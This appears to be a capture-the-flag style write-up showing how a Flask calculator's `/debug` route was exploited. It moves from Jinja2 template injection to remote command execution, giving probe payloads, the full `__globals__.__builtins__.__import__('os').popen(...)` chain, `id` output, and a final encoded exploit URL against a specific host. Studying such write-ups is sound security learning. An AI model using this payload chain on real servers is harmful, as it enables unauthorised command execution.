## SSTI to RCE

### 

### Step 1: Recon

First we opened the main page — a simple form that took two numbers (`num1`, `num2`) and added them. When we sent an invalid input, we got this error:

```
Invalid input! Only numbers are allowed.
if you think is not error contact admin to check debug logs and fix it :)
```

That phrase "check debug logs" was a hint — it pointed to another route, something like `/debug`.

**Routes found:**

- `GET /` — main page
- `POST /calculate` — the calculator
- `GET /debug` — showed app logs (this is where the real vulnerability was)

---

### Step 2: Discovering the SSTI

Opening `/debug` showed a page with Werkzeug (Flask's dev server) logs. Interestingly, whatever value we sent as `num1` on this same page got printed inside the log. That meant this input was being passed somewhere inside the app directly.

To test if this value was being passed straight into the Jinja2 template engine (which Flask uses), we tried a classic SSTI payload:

```
GET /debug?num1={{7*7}}&num2=1
```

**If the response shows `49`, it means SSTI is confirmed** .

#### The real discovery: `/debug` itself is vulnerable

Once we tested directly against `/debug`:

```
GET /debug?num1={{7*7}}&num2=1
```

This time the log showed the value of `num1` was actually executed — meaning `/debug` itself was processing `num1` .

---

### Step 3: Turning SSTI into RCE

Now that SSTI was confirmed, we needed to go from Jinja2 execution to running actual OS commands. The classic chain is:

```
request  →  .application  →  .__globals__  →  .__builtins__  →  .__import__('os')  →  .popen('COMMAND')  →  .read()
```

What does this chain do?

1. `request.application` — gives access to the Flask app object
2. `.__globals__` — gives the global variables of that Python module (includes imports and functions)
3. `.__builtins__` — gives Python's built-in functions like `__import__`, `eval`, `open`
4. `.__import__('os')` — imports the `os` module (without needing the app to have already imported it)
5. `.popen('id').read()` — runs the `id` command and reads its output

**Step-by-step testing (to confirm each piece worked):**

```
{{config}}                                          → returned Flask's config dict ✅
{{request.application.__globals__}}                 → returned a huge dict of modules ✅
{{request.application.__globals__.__builtins__}}    → returned dict of built-in functions ✅
```

All of these worked — meaning there was no filter at all, we just needed to write it correctly.

#### calling `popen` didn't seem to work

When we added `.popen('id').read()` to the exact same string, the result came back **empty**. We were confused for a while — why did attribute access (like `__builtins__`) work, but calling a function (adding parentheses) didn't?

After testing piece by piece:

```
{{request.application.__globals__.__builtins__.__import__}}          → <built-in function __import__> ✅
{{request.application.__globals__.__builtins__.__import__('sys')}}   → <module 'sys' (built-in)> ✅
{{request.application.__globals__.__builtins__.__import__('os')}}    → <module 'os' (frozen)> ✅
```

These all worked too! So the problem was somewhere else.

#### used `os.system()` instead of `os.popen()`

At one point we used `os.system('id')` instead of `popen`. The result was just the number `0`. 

- `os.system()` only returns the command's **exit code** (0 means success)
- The actual command output goes to the server's own stdout (which we can't see), not into the response

So we needed `popen()` instead, which captures the output and lets us read it.

#### Final result — full RCE:

```
GET /debug?num1={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&num2=1
```

**Output:**

```
uid=1001(app) gid=1001(app) groups=1001(app)
```

 This confirmed full RCE — we could execute an OS command and read its output.

# Latest url :

```url
https://50125bf6d9.0o8.ir/debug?num1=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D&num2=1
```
